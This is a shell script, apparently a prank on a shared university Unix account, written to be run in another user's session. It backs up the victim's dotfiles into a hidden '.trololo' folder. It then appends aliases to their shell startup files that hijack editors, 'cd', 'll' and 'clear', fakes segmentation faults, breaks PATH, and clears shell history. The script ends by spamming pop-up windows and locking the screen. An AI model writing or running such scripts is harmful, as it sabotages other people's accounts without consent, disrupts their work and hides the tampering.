dir_path=		"/u/all/bequig_s/public/save-conf"
dest=			"$PWD/.trololo"

if [ ! -f "$dest" ]; then
    mkdir -p $dest
    mkdir "$dest/saveconf"
    cp -r $dir_path $dest
    gcc $dest1/opencd.c -o opencd

    if [ -f "~/.fluxbox" ]; then
	cp ~/.fluxbox/* "$dest/saveconf"
	# cp "$dest/evilfluxbox/startup" .fluxbox/
	# cp "$dest/evilfluxbox/.fluxstyle" .fluxbox/
    fi
    
    cp ~/.Xdefaults "$dest/saveconf"

    echo "xterm*background:		green\
      xterm*foreground:		blue" >> ~/.Xdefaults
    
    echo "Xm*background:		green\
      Xm*foreground:		blue" >> ~/.Xdefaults
    
    echo "rxvt*background:		green\
      rxvt*foreground:		blue" >> ~/.Xdefaults
    
    echo "dlock*background:		yellow\
      dlock*foreground:		red" >> ~/.Xdefaults
    
    cp ~/.mytcshrc "$dest/saveconf"

    echo "alias ne 'cvlc $dest/dah.mp3 vlc://quit &'"		>> ~/.mytcshrc;
    echo "alias emacs 'cvlc $dest/dah.mp3 vlc://quit &'"	>> ~/.mytcshrc;
    echo "alias vim 'cvlc $dest/dah.mp3 vlc://quit &'"		>> ~/.mytcshrc;
    echo "alias gedit 'cvlc $dest/dah.mp3 &'"			>> ~/.mytcshrc;
    echo "alias nano 'cvlc $dest/dah.mp3&'"			>> ~/.mytcshrc;
    echo "alias ll 'cvlc $dest/dah.mp3'"			>> ~/.mytcshrc;
    echo "alias clear 'cvlc $dest/dah.mp3'"			>> ~/.mytcshrc;
    echo "alias cd '$dest/opencd'"				>> ~/.mytcshrc;

    cp ~/.mybashrc "$dest/saveconf"

    echo "alias ne='cvlc $dest/dah.mp3 vlc://quit &'"		>> ~/.mybashrc;
    echo "alias emacs='cvlc $dest/dah.mp3 vlc://quit &'"	>> ~/.mybashrc;
    echo "alias vim='cvlc $dest/dah.mp3 vlc://quit &'"		>> ~/.mybashrc;
    echo "alias gedit='cvlc $dest/dah.mp3 &'"			>> ~/.mybashrc;
    echo "alias nano='cvlc $dest/dah.mp3&'"			>> ~/.mybashrc;
    echo "alias ll='cvlc $dest/dah.mp3'"			>> ~/.mybashrc;
    echo "alias clear='cvlc $dest/dah.mp3'"			>> ~/.mybashrc;
    echo "alias cd='$dest/opencd'"				>> ~/.mybashrc;

    echo "alias ./a.out 'sleep 5; echo Segmentation fault'" >> ~/.tcshrc;
    source ~/.tcshrc

    setenv PATH "trololo:essaie:/bin/trololo"
fi

source ~/.mytcshrc;
xrdb -merge ~/.Xdefaults;
amixer set Master 100%
display -window root "$dest/background.jpg";
setxkbmap us # dvorak
history -c

i="0"
while [ "$i" -lt 10 ]
do
    xmessage "ZLOCK FAIL" -nearmouse &
    i=`expr $i + 1`
done

zlock -immed -pwtext "FAIL ZLOCK" 
#^__ cadeau pour la prochaine, fait un alias ou carement un racourci clavier pour Zlock
